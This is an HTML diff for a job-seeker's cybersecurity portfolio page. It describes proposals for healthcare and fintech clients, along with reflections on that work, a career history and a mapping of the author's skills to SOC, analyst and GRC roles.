+    <div class="callout scenario"><strong>Context</strong>CyberSync Hub is a specialist cybersecurity consultancy. The role involves researching client environments, identifying security gaps, proposing vendor solutions, sourcing OEMs and distributors, building presentation materials and contributing to project deployment.</div>
+    <p>Two substantive proposals authored. One healthcare, one fintech. Each required threat landscape research, technology selection, vendor capability mapping and a deliverable presentable at board level.</p>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">2  ·  Methodology: FMC Proposal</div>
+    <div class="walk-title">Federal Medical Centre, Abuja. Healthcare security</div>
+
+    <h4>The challenge</h4>
+    <p>FMC operates in a high-stakes healthcare environment where system availability directly affects patient care. The challenge is multi-layered. Unmanaged endpoints. Patient records moving across systems without consistent data loss controls. Databases accessed without anomaly detection. Ransomware and downtime risks that impact patient care directly.</p>
+
+    <h4>Research &amp; solution selection</h4>
+    <ul>
+      <li><strong>Ivanti Neurons for MDM</strong> addresses unmanaged endpoints through device enrolment, policy enforcement, posture assessment and data separation on shared clinical devices</li>
+      <li><strong>Trellix DLP and DAM</strong> protects data in motion and at rest, with continuous visibility into database access</li>
+      <li><strong>Commvault Backup and Recovery</strong> delivers ransomware resilience with immutable backup storage</li>
+      <li><strong>Kaspersky EDR</strong> provides behavioural endpoint detection, attack timeline reconstruction and automated containment</li>
+    </ul>
+
+    <h4>Proposal structure</h4>
+    <p>I opened with an executive summary framing security as an operational requirement for patient care rather than an IT function. The challenge section mapped each risk to a specific business impact. Each solution was introduced with practical examples. A final section showed how all four operate as a connected model.</p>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">3  ·  Methodology: Flutterwave Proposal</div>
+    <div class="walk-title">Zero Trust Network Access for fintech</div>
+
+    <h4>The challenge</h4>
+    <p>Flutterwave processes billions across multiple African markets. The challenge is structural. A distributed workforce. API-driven architecture where every integration is a potential entry vector. PCI-DSS, GDPR and NDPR compliance obligations. A legacy VPN that grants broad network access after a single authentication.</p>
+
+    <h4>ZTNA research</h4>
+    <ul>
+      <li>Every access request evaluated on identity, device posture, location, time and behavioural context before access is granted</li>
+      <li>Least-privilege access: each user granted access only to the specific application they need</li>
+      <li>Continuous session verification, where anomalous behaviour triggers step-up auth or session termination</li>
+      <li>Blast radius containment so compromised credentials cannot be used for lateral movement</li>
+    </ul>
+
+    <h4>Regulatory framing</h4>
+    <p>ZTNA was positioned not just as a security improvement but as a compliance enabler. Clear policy-based access logs satisfy PCI-DSS, GDPR and NDPR auditor requirements at the same time.</p>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">4  ·  Mistakes &amp; What I'd Do Differently</div>
+    <div class="walk-title">Reflection on the drafting process</div>
+    <div class="callout warn"><strong>Reflection</strong>Early drafts of the FMC proposal led with technical capabilities rather than clinical impact. The revision led with the consequence. Downtime affects patient care. Stakeholder audience analysis should happen before writing begins.</div>
+    <div class="callout warn"><strong>Reflection</strong>The Flutterwave ZTNA proposal initially framed ZTNA as a rip-and-replace proposition. That created budget and change-resistance objections. Repositioning it as additive made it a much easier conversation. Procurement psychology matters as much as technical accuracy.</div>
+  </div>
+
+  <div class="walk-section">
+    <div class="walk-num">5  ·  Lessons Learned</div>
+    <div class="walk-title">What this work taught me</div>
+    <div class="callout lesson"><strong>Lesson</strong>Writing proposals requires understanding the client's world, not just the technology. FMC's primary concern is patient care. Flutterwave's primary concern is transaction trust and regulatory standing. Security is the enabler. Not the story.</div>
+    <div class="callout lesson"><strong>Lesson</strong>Researching EDR, DLP, MDM and ZTNA to proposal depth builds the kind of product and threat knowledge that makes a security analyst more effective. Understanding what an EDR is supposed to detect, and why, makes alert triage faster and more confident.</div>
+    <div class="callout lesson"><strong>Lesson</strong>The difference between a security proposal and a sales document is specificity. Vague claims have no value. The same standard applies to incident reports. Specificity and evidence, not assertion.</div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     EXPERIENCE
+═══════════════════════════════════════════════ -->
+<div class="section" id="experience">
+  <div class="section-label">// Experience</div>
+  <div class="section-title">Career trajectory</div>
+  <p class="section-subtitle">Each role has added a layer. Operational discipline first, then technical depth, then commercial security exposure.</p>
+
+  <div class="xp-list">
+
+    <div class="xp-item">
+      <div class="xp-date">2025 to Present</div>
+      <div class="xp-content">
+        <div class="xp-role">Security Analyst (Consultancy)</div>
+        <div class="xp-org">CyberSync Hub</div>
+        <ul>
+          <li>Authored enterprise security proposals for clients across <strong>healthcare and fintech</strong>, including Ivanti MDM, Trellix DLP, Commvault and Kaspersky EDR for FMC, and a ZTNA architecture for Flutterwave</li>
+          <li>Researched emerging threats, vendor capabilities and frameworks across EDR, DLP, MDM, ZTNA, DAM and backup/recovery</li>
+          <li>Sourced OEM vendors and distributors. Evaluated product fit and supported commercial positioning</li>
+          <li>Developed presentation materials for both technical and C-suite audiences</li>
+          <li>Contributing to project deployment on familiar solutions from a delivery perspective</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="xp-item">
+      <div class="xp-date">01/2025 to Present</div>
+      <div class="xp-content">
+        <div class="xp-role">Case Administrator</div>
+        <div class="xp-org">Ministry of Justice, UK</div>
+        <ul>
+          <li>Provide first-line operational support to probation staff, resolving <strong>30+ enquiries daily</strong> with structured triage and prioritisation similar to SOC L1 workflow</li>
+          <li>Maintain <strong>98 to 100% data accuracy</strong> across case records. Run routine checks on incoming reports and escalate anomalies</li>
+          <li>Produce structured documentation that improved decision-making clarity by 25%</li>
+          <li>Track compliance across <strong>40 to 60 active cases daily</strong>. Identify recurring patterns and contribute to process improvements</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="xp-item">
+      <div class="xp-date">06/2024 to 09/2024</div>
+      <div class="xp-content">
+        <div class="xp-role">Cybersecurity Intern</div>
+        <div class="xp-org">Bright Network, UK</div>
+        <ul>
+          <li>Engaged with cybersecurity industry experts from <strong>BT Group and CrowdStrike</strong>, gaining insight into enterprise SOC operations and threat intelligence</li>
+          <li>Completed real-world IT and security simulations, improving analytical speed by 20%</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="xp-item">
+      <div class="xp-date">02/2021 to 01/2023</div>
+      <div class="xp-content">
+        <div class="xp-role">IT Support Technician</div>
+        <div class="xp-org">Barieeba Saro F.A &amp; Co</div>
+        <ul>
+          <li>Managed IT support tickets via <strong>ServiceNow</strong> with 100% issue traceability and SLA compliance</li>
+          <li>Diagnosed network connectivity issues using TCP/IP, DNS and DHCP knowledge, improving system reliability by 15%</li>
+          <li>Identified recurring problems through ticket trend analysis, reducing repeat incidents by 15%</li>
+          <li>Maintained secure data handling across audit and financial systems with <strong>zero data breaches</strong></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="xp-item">
+      <div class="xp-date">02/2019 to 07/2019</div>
+      <div class="xp-content">
+        <div class="xp-role">Technical Trainee</div>
+        <div class="xp-org">Intertel Nigeria Limited</div>
+        <ul>
+          <li>Hands-on exposure to VSAT installation, network function virtualisation, and enterprise networking through structured training</li>
+        </ul>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     WHAT I BRING
+═══════════════════════════════════════════════ -->
+<div class="section" id="bring">
+  <div class="section-label">// Role-fit mapping</div>
+  <div class="section-title">What I bring to each role</div>
+  <p class="section-subtitle">What each role typically asks for and where in this portfolio that requirement is evidenced.</p>
+
+  <div class="bring-grid">
+
+    <div class="bring-col">
+      <h3>SOC Analyst</h3>
+      <span class="bring-tag">Detection &amp; Response</span>
+      <div class="bring-row">
+        <div class="bring-need">Monitor SIEM alerts &amp; triage</div>
+        <div class="bring-have">SC-200 certified, 30+ daily triage events at MOJ, log analysis documented in pen test reports</div>
+      </div>
+      <div class="bring-row">
+        <div class="bring-need">Analyse network traffic</div>
+        <div class="bring-have">Wireshark, Nmap NSE scanning, TCP flag analysis documented in Projects 01 &amp; 02</div>
+      </div>
+      <div class="bring-row">
+        <div class="bring-need">Identify IOCs</div>
+        <div class="bring-have">CVE/CWE classification, hash analysis, GPS &amp; metadata IOCs documented across all projects</div>
+      </div>
+      <div class="bring-row">
+        <div class="bring-need">Escalate clearly</div>
+        <div class="bring-have">MOJ escalation discipline plus structured 5-part incident write-ups across portfolio</div>
+      </div>
+    </div>
+
+    <div class="bring-col">
+      <h3>Cybersecurity Analyst</h3>
+      <span class="bring-tag">Operations &amp; Architecture</span>
+      <div class="bring-row">
+        <div class="bring-need">Vulnerability assessment</div>
+        <div class="bring-have">Two full pen tests with CVSS-scored findings, CEH certified</div>
+      </div>
+      <div class="bring-row">
+        <div class="bring-need">Solution &amp; tool knowledge</div>
+        <div class="bring-have">EDR, DLP, MDM, ZTNA, DAM proposal-depth research at CyberSync Hub</div>
+      </div>
+      <div class="bring-row">
+        <div class="bring-need">Incident investigation</div>
+        <div class="bring-have">Court-ready forensics reports across Projects 03 and 04 covering mobile, disk and GPS</div>
+      </div>
+      <div class="bring-row">
+        <div class="bring-need">Cross-functional comms</div>
+        <div class="bring-have">Technical reporting for engineers plus executive briefings via CSH proposals</div>
+      </div>
+    </div>
+
+    <div class="bring-col">
+      <h3>GRC Analyst</h3>
+      <span class="bring-tag">Governance &amp; Compliance</span>
+      <div class="bring-row">
+        <div class="bring-need">Policy &amp; proposal writing</div>
+        <div class="bring-have">Two enterprise security proposals authored for regulated clients (healthcare, fintech)</div>
+      </div>
+      <div class="bring-row">
+        <div class="bring-need">Framework knowledge</div>
+        <div class="bring-have">NIST, OWASP, NCSC, ACPO, PCI-DSS, GDPR and NDPR applied in real proposals</div>
+      </div>
+      <div class="bring-row">
+        <div class="bring-need">Risk-to-business translation</div>
+        <div class="bring-have">FMC proposal mapped each security risk to specific patient-care impact</div>
+      </div>
+      <div class="bring-row">
+        <div class="bring-need">Audit-grade documentation</div>
+        <div class="bring-have">98 to 100% accuracy at MOJ plus court-admissible forensics reports</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     CTA / CONTACT
+═══════════════════════════════════════════════ -->
+<div class="section" id="contact">
+  <div class="cta-section">
+    <h2>Let's talk about your team</h2>
+    <p>I'm UK-based, work-authorised and available now. If you're hiring for entry-level SOC Analyst, Cybersecurity Analyst or GRC roles, I'd like to discuss how this experience could fit your team.</p>
+    <div class="cta-buttons">
+      <a href="mailto:akinlade.opeyemi23@gmail.com" class="btn btn-primary">akinlade.opeyemi23@gmail.com</a>
+      <a href="https://www.linkedin.com/in/opeyemiakinlade/" target="_blank" rel="noopener" class="btn btn-ghost">LinkedIn  <span class="btn-arrow">↗</span></a>
+    </div>
+  </div>
+</div>
+
+<!-- ════════════════════════════════════════════
+     FOOTER
+═══════════════════════════════════════════════ -->
+<div class="footer">
+  <div class="footer-left">Opeyemi Akinlade  ·  Cybersecurity Portfolio</div>
+  <div class="footer-right">UK · Available now</div>
+</div>
+
+</body>
+</html>
